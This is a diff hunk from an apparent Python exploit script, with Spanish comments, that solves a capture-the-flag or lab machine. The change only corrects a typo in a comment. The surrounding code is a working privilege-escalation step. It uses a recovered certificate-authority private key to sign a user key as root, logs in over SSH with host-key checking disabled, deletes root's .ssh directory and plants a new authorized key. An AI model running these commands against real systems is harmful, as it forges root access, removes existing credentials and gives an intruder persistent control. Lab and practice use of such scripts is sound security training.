@@ -268,7 +268,7 @@ def get_cert():
 			break
 
 	p1.success("Clave privada descubierta")
-	# Con la clave privada de la entidad certifadora ya descubierto, crea el certificado anombre del usuario root
+	# Con la clave privada de la entidad certifadora ya descubierto, crea el certificado a nombre del usuario root
 	# y accede con este para finalmente crear el archivo authorized_keys
 	log.info("Obteniendo la clave privada del usuario root...")
 	client.exec_command('chmod 600 key_cert && ssh-keygen -s key_cert -I 1 -n root_user .ssh/id_rsa.pub && ssh -p 2222 -o StrictHostKeyChecking=no -o CertificateFile=.ssh/id_rsa-cert.pub -i ~/.ssh/id_rsa root@localhost "rm -r .ssh; mkdir .ssh; ssh-keygen -t rsa -f .ssh/id_rsa -N \\"\\"; cp .ssh/id_rsa.pub .ssh/authorized_keys"')
